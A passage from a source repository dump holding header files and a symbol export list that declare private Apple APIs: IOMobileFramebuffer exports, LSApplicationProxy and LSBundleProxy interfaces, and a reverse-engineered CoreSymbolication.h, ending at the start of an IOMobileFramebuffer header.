                            _IOMobileFramebufferCopyLayerDisplayedSurface,
                            _IOMobileFramebufferCopyProperty,
                            _IOMobileFramebufferCreateDisplayList,
                            _IOMobileFramebufferCreateStatistics,
                            _IOMobileFramebufferDisableCRCNotifications,
                            _IOMobileFramebufferDisableHotPlugDetectNotifications,
                            _IOMobileFramebufferDisablePowerNotifications,
                            _IOMobileFramebufferDisableVSyncNotifications,
                            _IOMobileFramebufferEnableCRCNotifications,
                            _IOMobileFramebufferEnableDisableDithering,
                            _IOMobileFramebufferEnableDisableVideoPowerSavings,
                            _IOMobileFramebufferEnableHotPlugDetectNotifications,
                            _IOMobileFramebufferEnableMirroring,
                            _IOMobileFramebufferEnablePowerNotifications,
                            _IOMobileFramebufferEnableStatistics,
                            _IOMobileFramebufferEnableVSyncNotifications,
                            _IOMobileFramebufferFactoryPortal,
                            _IOMobileFramebufferFrameInfo,
                            _IOMobileFramebufferGetBlock,
                            _IOMobileFramebufferGetBrightnessControlCapabilities,
                            _IOMobileFramebufferGetBrightnessControlInfo,
                            _IOMobileFramebufferGetBufBlock,
                            _IOMobileFramebufferGetCRCNotifyMessageCount,
                            _IOMobileFramebufferGetCRCRunLoopSource,
                            _IOMobileFramebufferGetCanvasSizes,
                            _IOMobileFramebufferGetColorRemapMode,
                            _IOMobileFramebufferGetCurrentAbsoluteTime,
                            _IOMobileFramebufferGetDigitalOutMode,
                            _IOMobileFramebufferGetDigitalOutState,
                            _IOMobileFramebufferGetDisplayArea,
                            _IOMobileFramebufferGetDisplaySize,
                            _IOMobileFramebufferGetDotPitch,
                            _IOMobileFramebufferGetFrameworkInfo,
                            _IOMobileFramebufferGetGammaTable,
                            _IOMobileFramebufferGetHDCPAuthenticationProtocol,
                            _IOMobileFramebufferGetHDCPDownstreamState,
                            _IOMobileFramebufferGetHDCPRunLoopSource,
                            _IOMobileFramebufferGetHotPlugRunLoopSource,
                            _IOMobileFramebufferGetID,
                            _IOMobileFramebufferGetLayerDefaultSurface,
                            _IOMobileFramebufferGetLinkQuality,
                            _IOMobileFramebufferGetMainDisplay,
                            _IOMobileFramebufferGetMatrix,
                            _IOMobileFramebufferGetMirrorError,
                            _IOMobileFramebufferGetProtectionOptions,
                            _IOMobileFramebufferGetRunLoopSource,
                            _IOMobileFramebufferGetSecondaryDisplay,
                            _IOMobileFramebufferGetServiceObject,
                            _IOMobileFramebufferGetSupportedDigitalOutModes,
                            _IOMobileFramebufferGetTypeID,
                            _IOMobileFramebufferGetVSyncRunLoopSource,
                            _IOMobileFramebufferGetWirelessSurface,
                            _IOMobileFramebufferGetWirelessSurfaceWithOptions,
                            _IOMobileFramebufferHDCPGetReply,
                            _IOMobileFramebufferHDCPSendRequest,
                            _IOMobileFramebufferInstallVirtualDisplay,
                            _IOMobileFramebufferInstallVirtualDisplays,
                            _IOMobileFramebufferIsMainDisplay,
                            _IOMobileFramebufferKernelTests,
                            _IOMobileFramebufferOpen,
                            _IOMobileFramebufferOpenByName,
                            _IOMobileFramebufferReadyForSwap,
                            _IOMobileFramebufferRequestPowerChange,
                            _IOMobileFramebufferSPLCGetBrightness,
                            _IOMobileFramebufferSPLCSetBrightness,
                            _IOMobileFramebufferScheduleWithDispatchQueue,
                            _IOMobileFramebufferSetBlock,
                            _IOMobileFramebufferSetBrightnessControlCallback,
                            _IOMobileFramebufferSetBrightnessCorrection,
                            _IOMobileFramebufferSetCanvasSize,
                            _IOMobileFramebufferSetColorRemapMode,
                            _IOMobileFramebufferSetContrast,
                            _IOMobileFramebufferSetDebugFlags,
                            _IOMobileFramebufferSetDigitalOutMode,
                            _IOMobileFramebufferSetDisplayDevice,
                            _IOMobileFramebufferSetDroppable,
                            _IOMobileFramebufferSetFlags,
                            _IOMobileFramebufferSetGammaTable,
                            _IOMobileFramebufferSetIdleBuffer,
                            _IOMobileFramebufferSetLine21Data,
                            _IOMobileFramebufferSetMatrix,
                            _IOMobileFramebufferSetMirrorContentRegion,
                            _IOMobileFramebufferSetParameter,
                            _IOMobileFramebufferSetPreset,
                            _IOMobileFramebufferSetRenderingAngle,
                            _IOMobileFramebufferSetTVOutMode,
                            _IOMobileFramebufferSetTVOutSignalType,
                            _IOMobileFramebufferSetTwilightStrength,
                            _IOMobileFramebufferSetUnderrunColor,
                            _IOMobileFramebufferSetVideoDACGain,
                            _IOMobileFramebufferSetWSSInfo,
                            _IOMobileFramebufferSetWhiteOnBlackMode,
                            _IOMobileFramebufferSupportedFrameInfo,
                            _IOMobileFramebufferSurfaceIsReplaceable,
                            _IOMobileFramebufferSwapActiveRegion,
                            _IOMobileFramebufferSwapBegin,
                            _IOMobileFramebufferSwapCancel,
                            _IOMobileFramebufferSwapCancelAll,
                            _IOMobileFramebufferSwapDebugInfo,
                            _IOMobileFramebufferSwapDirtyRegion,
                            _IOMobileFramebufferSwapEnd,
                            _IOMobileFramebufferSwapSetAmbientLux,
                            _IOMobileFramebufferSwapSetBackgroundColor,
                            _IOMobileFramebufferSwapSetBlit,
                            _IOMobileFramebufferSwapSetBrightness,
                            _IOMobileFramebufferSwapSetBrightnessLimit,
                            _IOMobileFramebufferSwapSetColorMatrix,
                            _IOMobileFramebufferSwapSetColorRemapMode,
                            _IOMobileFramebufferSwapSetDisplayEdr,
                            _IOMobileFramebufferSwapSetDisplayEdrHeadroom,
                            _IOMobileFramebufferSwapSetGainMap,
                            _IOMobileFramebufferSwapSetGammaTable,
                            _IOMobileFramebufferSwapSetICCCurve,
                            _IOMobileFramebufferSwapSetICCMatrix,
                            _IOMobileFramebufferSwapSetLayer,
                            _IOMobileFramebufferSwapSetParams,
                            _IOMobileFramebufferSwapSetTimestamp,
                            _IOMobileFramebufferSwapSetTimestamps,
                            _IOMobileFramebufferSwapSetUISubRegion,
                            _IOMobileFramebufferSwapSetVideoDestEdgeAlpha,
                            _IOMobileFramebufferSwapSignal,
                            _IOMobileFramebufferSwapSubtitleRegion,
                            _IOMobileFramebufferSwapUIEdgeBlendMode,
                            _IOMobileFramebufferSwapWait,
                            _IOMobileFramebufferSwapWaitWithTimeout,
                            _IOMobileFramebufferSwapWorkaroundSettings,
                            _IOMobileFramebufferUnscheduleFromDispatchQueue,
                            _IOMobileFramebufferWaitSurface, _kIOMFB_TotalSwaps,
                            _kIOMFB_TotalVBLs ]
...

```

`BaseBin/_external/include/CoreServices/LSApplicationProxy.h`:

```h
#import "LSBundleProxy.h"
@interface LSApplicationProxy : LSBundleProxy
@property (getter=isInstalled,nonatomic,readonly) BOOL installed;
+ (instancetype)applicationProxyForIdentifier:(NSString *)identifier;
@property (nonatomic,readonly) NSSet * claimedURLSchemes;
@end
```

`BaseBin/_external/include/CoreServices/LSBundleProxy.h`:

```h
@interface LSBundleProxy : NSObject
@property (nonatomic) NSURL *bundleURL;
@property (nonatomic,readonly) NSString *bundleExecutable;
@end
```

`BaseBin/_external/include/CoreSymbolication.h`:

```h
//
//  CoreSymbolication.h
//
//  Created by R J Cooper on 05/06/2012.
//  This file: Copyright (c) 2012 Mountainstorm
//  API: Copyright (c) 2008 Apple Inc. All rights reserved.
//  
//  Permission is hereby granted, free of charge, to any person obtaining a copy
//  of this software and associated documentation files (the "Software"), to deal
//  in the Software without restriction, including without limitation the rights
//  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
//  copies of the Software, and to permit persons to whom the Software is
//  furnished to do so, subject to the following conditions:
//  
//  The above copyright notice and this permission notice shall be included in all
//  copies or substantial portions of the Software.
//  
//  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
//  SOFTWARE.
//

//
// Derived by looking at use within the dtrace source and a little bit of IDA work
//
// See the unit testcases for examples of how to use the API; its a really nice symbol
// api, a real shame Apple dont make it a public framework. 
//
// Things you might want to know;
//  - a Symbolicator is a top level object representing the kernel/process etc
//  - a Symbolicator contains multiple SymbolOwners
// 
//  - a SymbolOwner represents a blob which owns symbols e.g. executable, library
//  - a SymbolOwner contains multiple regions and contains multiple symbols
//
//  - a Region represents a continuous block of memory within a symbol owner e.g. the  __TEXT __objc_classname section
//  - a Region contains multiple symbols ... not it doesn't own them, just contains them
//
//  - a Symbol represents a symbol e.g. function, variable
//

#if !defined(__CORESYMBOLICATION_CORESYMBOLICATION__)
#define __CORESYMBOLICATION_CORESYMBOLICATION__ 1
#define __CORESYMBOLICATION__ 1

#ifdef __cplusplus
extern "C" {
#endif

#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>


/*
 * Types
 */
// Under the hood the framework basically just calls through to a set of C++ libraries
struct sCSTypeRef {
	void* csCppData;	// typically retrieved using CSCppSymbol...::data(csData & 0xFFFFFFF8)
	void* csCppObj;		// a pointer to the actual CSCppObject
};
typedef struct sCSTypeRef CSTypeRef;


typedef CSTypeRef CSSymbolicatorRef;
typedef CSTypeRef CSSourceInfoRef;
typedef CSTypeRef CSSymbolOwnerRef;
typedef CSTypeRef CSSectionRef;
typedef CSTypeRef CSSegmentRef;
typedef CSTypeRef CSSymbolRef;
typedef CSTypeRef CSRegionRef;
typedef CSTypeRef CSUUIDRef;


struct sCSRange {
   unsigned long long location;
   unsigned long long length;
};
typedef struct sCSRange CSRange;


// Note: this structure may well be wrong
typedef struct sCSNotificationData {
	CSSymbolicatorRef symbolicator;
	union {
		struct {
			long value;
		} ping;
		
		struct {
			CSSymbolOwnerRef symbolOwner;
		} dyldLoad;
	} u;
} CSNotificationData;


typedef void* CSDictionaryKeyCallBacks;
typedef void* CSDictionaryValueCallBacks;
typedef void* CSSetCallBacks;


typedef int (^CSNotification)(uint32_t notification_type, CSNotificationData data);
typedef int (^CSRegionIterator)(CSRegionRef region);
typedef int (^CSSymbolOwnerIterator)(CSSymbolOwnerRef owner);
typedef int (^CSSectionIterator)(CSSectionRef section);
typedef int (^CSSourceInfoIterator)(CSSourceInfoRef sourceInfo);
typedef int (^CSSymbolIterator)(CSSymbolRef symbol);
typedef int (^CSSegmentIterator)(CSSegmentRef segment);


/*
 * Defines
 */
#define kCSNull								((CSTypeRef) {NULL, NULL})
#define kCSNow								0x8000000000000000ull
// we've no idea what value kCSSymbolOwnerDataFoundDsym has; its only use in dtrace has been optimised out
#define kCSSymbolOwnerDataFoundDsym			0
#define kCSSymbolOwnerIsAOut				0
#define kCSSymbolicatorTrackDyldActivity	1

#define kCSNotificationPing					1
#define kCSNotificationInitialized			0x0010
#define kCSNotificationDyldLoad				0x0100
#define kCSNotificationDyldUnload			0x0101
// kCSNotificationTimeout must be a value greater than 0x1001
#define kCSNotificationTimeout				0x1002
#define kCSNotificationTaskExit				0x1000
#define kCSNotificationFini					0x80000000


/*
 * External symbols
 */

extern const char* kCSRegionMachHeaderName;
extern const CSDictionaryKeyCallBacks kCSTypeDictionaryKeyCallBacks;
extern const CSDictionaryValueCallBacks kCSTypeDictionaryValueCallBacks;
extern const CSDictionaryKeyCallBacks kCSTypeDictionaryWeakKeyCallBacks;
extern const CSDictionaryValueCallBacks kCSTypeDictionaryWeakValueCallBacks;
extern const CSSetCallBacks kCSTypeSetCallBacks;
extern const CSSetCallBacks kCSTypeSetWeakCallBacks;


/*
 * Architecture functions
 */
// Valid names: i386, x86_64, arm, armv4t, armv5tej, armv6, armv7, armv7f, armv7k, ppc, ppc64
cpu_type_t CSArchitectureGetArchitectureForName(const char* arch);
cpu_type_t CSArchitectureGetCurrent();
cpu_type_t CSArchitectureGetFamily(cpu_type_t type);
const char* CSArchitectureGetFamilyName(cpu_type_t type);

Boolean CSArchitectureIs32Bit(cpu_type_t type);
Boolean CSArchitectureIs64Bit(cpu_type_t type);
Boolean CSArchitectureIsArm(cpu_type_t type);
Boolean CSArchitectureIsBigEndian(cpu_type_t type);
Boolean CSArchitectureIsI386(cpu_type_t type);
Boolean CSArchitectureIsLittleEndian(cpu_type_t type);
Boolean CSArchitectureIsPPC(cpu_type_t type);
Boolean CSArchitectureIsPPC64(cpu_type_t type);
Boolean CSArchitectureIsX86_64(cpu_type_t type);

Boolean CSArchitectureMatchesArchitecture(cpu_type_t a, cpu_type_t b);


/*
 * Description functions
 */
CFStringRef CSCopyDescription(CSTypeRef cs);
CFStringRef CSCopyDescriptionWithIndent(CSTypeRef cs, unsigned int indent);


/*
 * General utility functions
 */
Boolean CSEqual(CSTypeRef cs1, CSTypeRef cs2);
//XXX: CSExceptionSafeThreadRunBlock
CFIndex CSGetRetainCount(CSTypeRef cs);
Boolean CSIsNull(CSTypeRef cs);
CSTypeRef CSRetain(CSTypeRef cs);
void CSRelease(CSTypeRef cs);
void CSShow(CSTypeRef cs);


/*
 * Dyld functions
 */
vm_address_t CSGetDyldSharedCacheSlide(mach_port_t port);
CSUUIDRef CSGetDyldSharedCacheUUID(mach_port_t port);


/*
 * XXX: Map functions
 */
//CSMMapArchiveCacheCopyMMapArchive
//CSMMapArchiveCacheReleaseMMapArchive
//CSMMapArchiveCacheSetShouldStoreToDaemon


/*
 * Range functions
 */
Boolean CSRangeContainsRange(CSRange r1, CSRange r2);
Boolean CSRangeIntersectsRange(CSRange r1, CSRange r2);


/*
 * Region functions
 */
CFStringRef CSRegionCopyDescriptionWithIndent(CSRegionRef region, unsigned int indent);
int CSRegionForeachSourceInfo(CSRegionRef region, CSSourceInfoIterator each);
int CSRegionForeachSymbol(CSRegionRef region, CSSymbolIterator each);
const char* CSRegionGetName(CSRegionRef region);
CSRange CSRegionGetRange(CSRegionRef region);
CSSymbolOwnerRef CSRegionGetSymbolOwner(CSRegionRef region);
CSSymbolicatorRef CSRegionGetSymbolicator(CSRegionRef region);


/*
 * XXX: Section/Segment functions
 */
/*
CSSectionGetSegment
CSSegmentForeachSection
*/


/*
 * XXX: Signature functions
 */
/*
CSSignatureAddSegment
CSSignatureAllocateSegments
CSSignatureCopy
CSSignatureEncodeSymbolOwner
CSSignatureEncodeSymbolicator
CSSignatureFreeSegments
*/


/*
 * Source Info functions
 */
CFStringRef CSSourceInfoCopyDescriptionWithIndent(CSSourceInfoRef info, unsigned int indent);
int CSSourceInfoGetColumn(CSSourceInfoRef info);
const char* CSSourceInfoGetFilename(CSSourceInfoRef info);
int CSSourceInfoGetLineNumber(CSSourceInfoRef info);
const char* CSSourceInfoGetPath(CSSourceInfoRef info);
CSRange CSSourceInfoGetRange(CSSourceInfoRef info);
CSRegionRef CSSourceInfoGetRegion(CSSourceInfoRef info);
CSSymbolRef CSSourceInfoGetSymbol(CSSourceInfoRef info);
CSSymbolOwnerRef CSSourceInfoGetSymbolOwner(CSSourceInfoRef info);
CSSymbolicatorRef CSSourceInfoGetSymbolicator(CSSourceInfoRef info);


/*
 * Symbol functions
 */

CFStringRef CSSymbolCopyDescriptionWithIndent(CSSymbolRef sym, unsigned int indent);
int CSSymbolForeachSourceInfo(CSSymbolRef sym, CSSourceInfoIterator);
long CSSymbolGetFlags(CSSymbolRef sym);
CSTypeRef CSSymbolGetInstructionData(CSSymbolRef sym);
const char* CSSymbolGetMangledName(CSSymbolRef sym);
const char* CSSymbolGetName(CSSymbolRef sym);
CSRange CSSymbolGetRange(CSSymbolRef sym);
CSRegionRef CSSymbolGetRegion(CSSymbolRef sym);
CSSectionRef CSSymbolGetSection(CSSymbolRef sym);
CSSegmentRef CSSymbolGetSegment(CSSymbolRef sym);
CSSymbolOwnerRef CSSymbolGetSymbolOwner(CSSymbolRef sym);
CSSymbolicatorRef CSSymbolGetSymbolicator(CSSymbolRef sym);
Boolean CSSymbolIsArm(CSSymbolRef sym);
Boolean CSSymbolIsDebugMap(CSSymbolRef sym);
Boolean CSSymbolIsDwarf(CSSymbolRef sym);
Boolean CSSymbolIsDyldStub(CSSymbolRef sym);
Boolean CSSymbolIsExternal(CSSymbolRef sym);
Boolean CSSymbolIsFunction(CSSymbolRef sym);
Boolean CSSymbolIsFunctionStarts(CSSymbolRef sym);
Boolean CSSymbolIsKnownLength(CSSymbolRef sym);
Boolean CSSymbolIsMangledNameSourceDwarf(CSSymbolRef sym);
Boolean CSSymbolIsMangledNameSourceDwarfMIPSLinkage(CSSymbolRef sym);
Boolean CSSymbolIsMangledNameSourceNList(CSSymbolRef sym);
Boolean CSSymbolIsMerged(CSSymbolRef sym);
Boolean CSSymbolIsNList(CSSymbolRef sym);
Boolean CSSymbolIsNameSourceDwarf(CSSymbolRef sym);
Boolean CSSymbolIsNameSourceDwarfMIPSLinkage(CSSymbolRef sym);
Boolean CSSymbolIsNameSourceNList(CSSymbolRef sym);
Boolean CSSymbolIsObjcMethod(CSSymbolRef sym);
Boolean CSSymbolIsOmitFramePointer(CSSymbolRef sym);
Boolean CSSymbolIsPrivateExternal(CSSymbolRef sym);
Boolean CSSymbolIsThumb(CSSymbolRef sym);
Boolean CSSymbolIsUnnamed(CSSymbolRef sym);


/*
 * XXX: SymbolOwner functions
 */
/*
CSSymbolOwnerAddInContext
CSSymbolOwnerCacheFlush
CSSymbolOwnerCacheGetEntryCount
CSSymbolOwnerCacheGetFlags
CSSymbolOwnerCacheGetMemoryLimit
CSSymbolOwnerCacheGetMemoryUsed
CSSymbolOwnerCachePrintEntries
CSSymbolOwnerCachePrintStats
CSSymbolOwnerCacheResetStats
CSSymbolOwnerCacheSetFlags
CSSymbolOwnerCacheSetMemoryLimit
CSSymbolOwnerCopyDescriptionWithIndent
CSSymbolOwnerCreateSignature
CSSymbolOwnerEditRelocations
CSSymbolOwnerForeachRegion
CSSymbolOwnerForeachRegionWithName
CSSymbolOwnerForeachSection
CSSymbolOwnerForeachSegment
CSSymbolOwnerForeachSourceInfo
CSSymbolOwnerForeachSymbol
CSSymbolOwnerForeachSymbolWithMangledName
CSSymbolOwnerForeachSymbolWithName
CSSymbolOwnerGetArchitecture
CSSymbolOwnerGetBaseAddress
CSSymbolOwnerGetCompatibilityVersion
CSSymbolOwnerGetCurrentVersion
CSSymbolOwnerGetDataFlags
CSSymbolOwnerGetDataTypeID
CSSymbolOwnerGetDsymPath
CSSymbolOwnerGetDsymVersion
CSSymbolOwnerGetFlags
CSSymbolOwnerGetLastModifiedTimestamp
CSSymbolOwnerGetLoadTimestamp
CSSymbolOwnerGetName
CSSymbolOwnerGetPath
CSSymbolOwnerGetRegionCount
CSSymbolOwnerGetRegionWithAddress
CSSymbolOwnerGetRegionWithName
CSSymbolOwnerGetSectionWithAddress
CSSymbolOwnerGetSectionWithName
CSSymbolOwnerGetSegmentWithAddress
CSSymbolOwnerGetSourceInfoCount
CSSymbolOwnerGetSourceInfoWithAddress
CSSymbolOwnerGetSymbolCount
CSSymbolOwnerGetSymbolWithAddress
CSSymbolOwnerGetSymbolWithMangledName
CSSymbolOwnerGetSymbolWithName
CSSymbolOwnerGetSymbolicator
CSSymbolOwnerGetTransientUserData
CSSymbolOwnerGetUUID
CSSymbolOwnerGetUnloadTimestamp
CSSymbolOwnerGetVersion
CSSymbolOwnerIsAOut
CSSymbolOwnerIsBundle
CSSymbolOwnerIsCommpage
CSSymbolOwnerIsDsym
CSSymbolOwnerIsDyld
CSSymbolOwnerIsDyldSharedCache
CSSymbolOwnerIsDylib
CSSymbolOwnerIsDylibStub
CSSymbolOwnerIsKextBundle
CSSymbolOwnerIsMachO
CSSymbolOwnerIsMutable
CSSymbolOwnerIsObjCGCSupported
CSSymbolOwnerIsObjCRetainReleaseSupported
CSSymbolOwnerIsObject
CSSymbolOwnerIsObsolete
CSSymbolOwnerIsPIE
CSSymbolOwnerIsProtected
CSSymbolOwnerIsRestricted
CSSymbolOwnerIsSlid
CSSymbolOwnerIsStaticLibraryArchiveEntry
CSSymbolOwnerMakeMutableInContext
CSSymbolOwnerRemoveInContext
CSSymbolOwnerSetLoadTimestamp
CSSymbolOwnerSetPath
CSSymbolOwnerSetRelocationCount
CSSymbolOwnerSetTransientUserData
CSSymbolOwnerSetUnloadTimestamp
*/


/*
 * XXX: Symbolicator functions
 */
// XXX: CSSymbolicatorAddSymbolOwner
// XXX: CSSymbolicatorApplyMutableContextBlock
CFStringRef CSSymbolicatorCopyDescriptionWithIndent(CSSymbolicatorRef cs, unsigned int indent);
CFDataRef CSSymbolicatorCreateSignature(CSSymbolicatorRef cs);

CSSymbolicatorRef CSSymbolicatorCreateWithMachKernel(void);
CSSymbolicatorRef CSSymbolicatorCreateWithMachKernelFlagsAndNotification(long flags, CSNotification notification);
CSSymbolicatorRef CSSymbolicatorCreateWithPathAndArchitecture(const char* path, cpu_type_t type);
CSSymbolicatorRef CSSymbolicatorCreateWithPathArchitectureFlagsAndNotification(const char* path, cpu_type_t type, long flags, CSNotification notification);
CSSymbolicatorRef CSSymbolicatorCreateWithPid(pid_t pid);
CSSymbolicatorRef CSSymbolicatorCreateWithPidFlagsAndNotification(pid_t pid, long flags, CSNotification notification);
CSSymbolicatorRef CSSymbolicatorCreateWithSignature(CFDataRef sig);
CSSymbolicatorRef CSSymbolicatorCreateWithSignatureAndNotification(CFDataRef sig, CSNotification notification);
CSSymbolicatorRef CSSymbolicatorCreateWithTask(task_t task);
CSSymbolicatorRef CSSymbolicatorCreateWithTaskFlagsAndNotification(task_t task, long flags, CSNotification notification);
CSSymbolicatorRef CSSymbolicatorCreateWithURLAndArchitecture(CFURLRef url, cpu_type_t type);
CSSymbolicatorRef CSSymbolicatorCreateWithURLArchitectureFlagsAndNotification(CFURLRef url, cpu_type_t type, long flags, CSNotification notification);

int CSSymbolicatorForceFullSymbolExtraction(CSSymbolicatorRef cs);
int CSSymbolicatorForeachRegionAtTime(CSSymbolicatorRef cs, uint64_t time, CSRegionIterator it);
int CSSymbolicatorForeachRegionWithNameAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time, CSRegionIterator it);
int CSSymbolicatorForeachSectionAtTime(CSSymbolicatorRef cs, uint64_t time, CSSectionIterator it);
int CSSymbolicatorForeachSegmentAtTime(CSSymbolicatorRef cs, uint64_t time, CSSegmentIterator it);
// XXX: CSSymbolicatorForeachSharedCache
// XXX: CSSymbolicatorForeachSharedCacheSymbolicatorWithFlagsAndNotification
int CSSymbolicatorForeachSourceInfoAtTime(CSSymbolicatorRef cs, uint64_t time, CSSourceInfoIterator it);
int CSSymbolicatorForeachSymbolAtTime(CSSymbolicatorRef cs, uint64_t time, CSSymbolIterator it);
int CSSymbolicatorForeachSymbolOwnerAtTime(CSSymbolicatorRef cs, uint64_t time, CSSymbolOwnerIterator it);

// XXX: CSSymbolicatorForeachSymbolOwnerWithCFUUIDBytesAtTime
int CSSymbolicatorForeachSymbolOwnerWithFlagsAtTime(CSSymbolicatorRef symbolicator, long flags, uint64_t time, CSSymbolOwnerIterator it);
int CSSymbolicatorForeachSymbolOwnerWithNameAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time, CSSymbolOwnerIterator it);
int CSSymbolicatorForeachSymbolOwnerWithPathAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time, CSSymbolOwnerIterator it);
// XXX: CSSymbolicatorForeachSymbolOwnerWithUUIDAtTime
int CSSymbolicatorForeachSymbolWithMangledNameAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time, CSSymbolIterator it);
int CSSymbolicatorForeachSymbolWithNameAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time, CSSymbolIterator it);
// XXX: CSSymbolicatorForeachSymbolicatorWithPath
// XXX: CSSymbolicatorForeachSymbolicatorWithPathFlagsAndNotification
// XXX: CSSymbolicatorForeachSymbolicatorWithURL
// XXX: CSSymbolicatorForeachSymbolicatorWithURLFlagsAndNotification

CSSymbolOwnerRef CSSymbolicatorGetAOutSymbolOwner(CSSymbolicatorRef cs);
cpu_type_t CSSymbolicatorGetArchitecture(CSSymbolicatorRef cs);
vm_address_t CSSymbolicatorGetDyldAllImageInfosAddress(CSSymbolicatorRef cs);

long CSSymbolicatorGetFlagsForDebugMapOnlyData(void);
long CSSymbolicatorGetFlagsForDsymOnlyData(void);
long CSSymbolicatorGetFlagsForDwarfOnlyData(void);
long CSSymbolicatorGetFlagsForFunctionStartsOnlyData(void);
long CSSymbolicatorGetFlagsForNListOnlyData(void);
long CSSymbolicatorGetFlagsForNoSymbolOrSourceInfoData(void);

pid_t CSSymbolicatorGetPid(CSSymbolicatorRef cs);
int CSSymbolicatorGetRegionCountAtTime(CSSymbolicatorRef cs, uint64_t time);
CSRegionRef CSSymbolicatorGetRegionWithAddressAtTime(CSSymbolicatorRef cs, vm_address_t addr, uint64_t time);
CSRegionRef CSSymbolicatorGetRegionWithNameAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time);
CSSectionRef CSSymbolicatorGetSectionWithAddressAtTime(CSSymbolicatorRef cs, vm_address_t addr, uint64_t time);
CSSegmentRef CSSymbolicatorGetSegmentWithAddressAtTime(CSSymbolicatorRef cs, vm_address_t addr, uint64_t time);
vm_address_t CSSymbolicatorGetSharedCacheSlide(CSSymbolicatorRef cs);
CSUUIDRef CSSymbolicatorGetSharedCacheUUID(CSSymbolicatorRef cs);
int CSSymbolicatorGetSourceInfoCountAtTime(CSSymbolicatorRef cs, uint64_t time);
CSSourceInfoRef CSSymbolicatorGetSourceInfoWithAddressAtTime(CSSymbolicatorRef cs, vm_address_t addr, uint64_t time);
int CSSymbolicatorGetSymbolCountAtTime(CSSymbolicatorRef cs, uint64_t time);
CSSymbolOwnerRef CSSymbolicatorGetSymbolOwner(CSSymbolicatorRef cs);
int CSSymbolicatorGetSymbolOwnerCountAtTime(CSSymbolicatorRef cs, uint64_t time);
CSSymbolOwnerRef CSSymbolicatorGetSymbolOwnerWithAddressAtTime(CSSymbolicatorRef cs, vm_address_t addr, uint64_t time);
// XXX: CSSymbolicatorGetSymbolOwnerWithCFUUIDBytesAtTime
CSSymbolOwnerRef CSSymbolicatorGetSymbolOwnerWithNameAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time);
CSSymbolOwnerRef CSSymbolicatorGetSymbolOwnerWithUUIDAtTime(CSSymbolicatorRef symbolicator, CFUUIDRef uuid, uint64_t time);
CSSymbolRef CSSymbolicatorGetSymbolWithAddressAtTime(CSSymbolicatorRef cs, vm_address_t addr, uint64_t time);
CSSymbolRef CSSymbolicatorGetSymbolWithMangledNameAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time);
CSSymbolRef CSSymbolicatorGetSymbolWithMangledNameFromSymbolOwnerWithNameAtTime(CSSymbolicatorRef cs, CSSymbolOwnerRef owner, const char* name, uint64_t time);
CSSymbolRef CSSymbolicatorGetSymbolWithNameAtTime(CSSymbolicatorRef cs, const char* name, uint64_t time);
CSSymbolRef CSSymbolicatorGetSymbolWithNameFromSymbolOwnerWithNameAtTime(CSSymbolicatorRef cs, CSSymbolOwnerRef owner, const char* name, uint64_t time);
mach_port_t CSSymbolicatorGetTask(CSSymbolicatorRef cs);
Boolean CSSymbolicatorIsKernelSymbolicator(CSSymbolicatorRef cs);
Boolean CSSymbolicatorIsTaskTranslated(CSSymbolicatorRef cs);
Boolean CSSymbolicatorIsTaskValid(CSSymbolicatorRef cs);
void CSSymbolicatorResymbolicate(CSSymbolicatorRef cs);
void CSSymbolicatorResymbolicateFail(CSSymbolicatorRef cs);
int CSSymbolicatorSetForceGlobalSafeMachVMReads(CSSymbolicatorRef cs);


/*
 * XXX: CSUUID
 */
 /*
CSUUIDCFUUIDBytesToPath
CSUUIDCFUUIDBytesToString
CSUUIDStringToCFUUIDBytes
*/




/*
 * SymbolOwner functions
 */
const char* CSSymbolOwnerGetPath(CSSymbolOwnerRef symbol);
const char* CSSymbolOwnerGetName(CSSymbolOwnerRef symbol);
vm_address_t CSSymbolOwnerGetBaseAddress(CSSymbolOwnerRef owner);
cpu_type_t CSSymbolOwnerGetArchitecture(CSSymbolOwnerRef owner);
Boolean CSSymbolOwnerIsObject(CSSymbolOwnerRef owner);
long CSSymbolOwnerGetDataFlags(CSSymbolOwnerRef owner);
CSRegionRef CSSymbolOwnerGetRegionWithName(CSSymbolOwnerRef owner, const char* name);
CSSymbolRef CSSymbolOwnerGetSymbolWithName(CSSymbolOwnerRef owner, const char* name);
CSSymbolRef CSSymbolOwnerGetSymbolWithAddress(CSSymbolOwnerRef owner, mach_vm_address_t addr);

long CSSymbolOwnerForeachSymbol(CSSymbolOwnerRef owner, CSSymbolIterator each);

CFUUIDBytes *CSSymbolOwnerGetCFUUIDBytes(CSSymbolOwnerRef owner);

/* Other exports

__crashreporter_info__
clear_mapped_memory
create_mapped_memory_cache_for_task
create_sampling_context_for_task
demangle
destroy_mapped_memory_cache
destroy_sampling_context
dispatch_queue_name_for_serial_number
find_node
fixup_frames
get_remote_thread_dispatch_queue

map_new_node
mapped_memory_read
mapped_memory_read_pointer
next_node
sample_remote_thread
sample_remote_thread_with_dispatch_queue
sampling_context_clear_cache
task_is_64bit
thread_name_for_thread_port
*/

#ifdef __cplusplus
} // extern "C"
#endif

#endif /* ! __CORESYMBOLICATION_CORESYMBOLICATION__ */
```

`BaseBin/_external/include/IOMobileFramebuffer/IOMobileFramebuffer.h`:

```h
#ifndef IOMOBILEFRAMEBUFFER_IOMOBILEFRAMEBUFFER_H
#define IOMOBILEFRAMEBUFFER_IOMOBILEFRAMEBUFFER_H

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/IOTypes.h>
#include <CoreGraphics/CoreGraphics.h>

typedef IOReturn IOMobileFramebufferReturn;
